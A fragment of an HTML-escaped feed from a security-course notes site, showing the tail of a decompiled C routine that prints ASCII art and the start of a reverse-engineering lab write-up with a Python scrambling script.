&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">6760&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>LL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x27(2023 Lab - Scramble)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/</guid><description>&lt;h1 id="simple-reverse---0x272023-lab---scramble">
 Simple Reverse - 0x27(2023 Lab - Scramble)
 &lt;a class="anchor" href="#simple-reverse---0x272023-lab---scramble">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler scramble.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> random
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">generate_scramble_pattern&lt;/span>(pattern_length, max_shift, max_add_sub):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_pattern &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, pattern_length)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> operation &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
